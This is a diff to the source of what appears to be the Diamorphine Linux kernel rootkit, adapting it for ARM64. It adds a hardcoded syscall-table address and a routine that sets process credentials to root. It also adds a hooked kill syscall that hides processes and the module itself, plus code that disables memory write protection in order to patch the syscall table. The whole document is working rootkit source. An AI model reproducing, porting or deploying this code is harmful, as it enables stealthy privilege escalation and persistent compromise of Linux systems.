@@ -56,6 +56,15 @@ static unsigned long *__sys_call_table;
 	orig_kill_t orig_kill;
 #endif
 
+unsigned long *
+get_syscall_table_bf(void)
+{
+	unsigned long *syscall_table;
+	//syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)0xffff800010a31778;
+	return syscall_table;
+}
+
 struct task_struct *
 find_task(pid_t pid)
 {
@@ -217,6 +226,12 @@ out:
 void
 give_root(void)
 {
+	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+		current->uid = current->gid = 0;
+		current->euid = current->egid = 0;
+		current->suid = current->sgid = 0;
+		current->fsuid = current->fsgid = 0;
+	#else
 		struct cred *newcreds;
 		newcreds = prepare_creds();
 		if (newcreds == NULL)
@@ -235,6 +250,7 @@ give_root(void)
 			newcreds->fsuid = newcreds->fsgid = 0;
 		#endif
 		commit_creds(newcreds);
+	#endif
 }
 
 static inline void
@@ -261,11 +277,22 @@ module_hide(void)
 	module_hidden = 1;
 }
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage int
 hacked_kill(const struct pt_regs *pt_regs)
 {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+	pid_t pid = (pid_t) pt_regs->di;
+	int sig = (int) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
 	pid_t pid = (pid_t) pt_regs->regs[0];
 	int sig = (int) pt_regs->regs[1];
+#endif
+#else
+asmlinkage int
+hacked_kill(pid_t pid, int sig)
+{
+#endif
 	struct task_struct *task;
 	switch (sig) {
 		case SIGINVIS:
@@ -281,17 +308,32 @@ hacked_kill(const struct pt_regs *pt_regs)
 			else module_hide();
 			break;
 		default:
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 			return orig_kill(pt_regs);
+#else
+			return orig_kill(pid, sig);
+#endif
 	}
 	return 0;
 }
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static inline void
+write_cr0_forced(unsigned long val)
+{
+	unsigned long __force_order;
+
+	asm volatile(
+		"mov %0, %%cr0"
+		: "+r"(val), "+m"(__force_order));
+}
+#endif
 
 static inline void
 protect_memory(void)
 {
 	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL_RO);
-
 }
 
 static inline void
@@ -304,29 +346,34 @@ unprotect_memory(void)
 static int __init
 diamorphine_init(void)
 {
-	__sys_call_table  = (unsigned long*)0xffff800008b50a08;
-	update_mapping_prot = (void *)0xffff80000803c6e4;
-	start_rodata = (unsigned long)0xffff800008b50000;
-	init_begin = (unsigned long)0xffff800008f06000;
 
-
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+    printk("here i am\n");
 
 	module_hide();
 	tidy();
 
-	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
-	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+	__sys_call_table = get_syscall_table_bf();
+	if (!__sys_call_table)
+    {
+		return -1;
+    }
+
+	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
+	/* start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata"); */
+	/* init_begin = (unsigned long)kallsyms_lookup_name("__init_begin"); */
+
+	start_rodata = (unsigned long)0xffff800010a30000;
+	init_begin= (unsigned long)0xffff800010d50000;
+
+    /* ./arch/arm/tools/syscall.tbl */
+	orig_getdents = (t_syscall)__sys_call_table[141];
+	orig_getdents64 = (t_syscall)__sys_call_table[217];
+	orig_kill = (t_syscall)__sys_call_table[37];
 
 	unprotect_memory();
-
-	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+	/* __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents; */
+	/* __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64; */
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
 	protect_memory();
 
 	return 0;
@@ -335,13 +382,13 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
+
 	unprotect_memory();
-
-	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	/* __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents; */
+	/* __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64; */
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-
 	protect_memory();
+
 }
 
 module_init(diamorphine_init);
